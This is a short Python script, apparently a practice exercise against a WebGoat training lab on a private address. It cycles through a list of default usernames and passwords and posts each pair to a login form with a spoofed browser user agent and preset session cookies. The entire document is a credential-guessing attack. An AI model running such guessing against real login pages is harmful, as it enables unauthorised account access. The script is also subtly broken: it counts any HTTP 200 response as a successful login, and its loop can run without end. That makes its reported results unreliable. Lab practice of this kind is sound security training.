import requests

def logins():
    max_attemps = 3
    accounts = {"admin":"admin", "root":"rooot", "admin1":"admin1"}
    headers = {'User-Agent': "Gecko/20100101 Firefox/115.0"}
    cookies = {"JSESSIONID":"abc", "acopendivids":"swingset,jotto,phpbb2,redmine", "acgroupswithpersist":"nada"}
    url = "http://192.168.0.161/WebGoat/attack?Screen=63&menu=1200"

    login_attemps = 0
    while login_attemps < max_attemps:
        for key, value in accounts.items():
            params = {"User Name":key, "Password":value, "SUBMIT":"Login"}
            r = requests.post(url, headers=headers, cookies=cookies, params=params)
            if r.status_code == 200:
                login_attemps +=1
                print(f"login succesful with user:{key} and password:{value}")
            else:
                print("login failed")
logins()
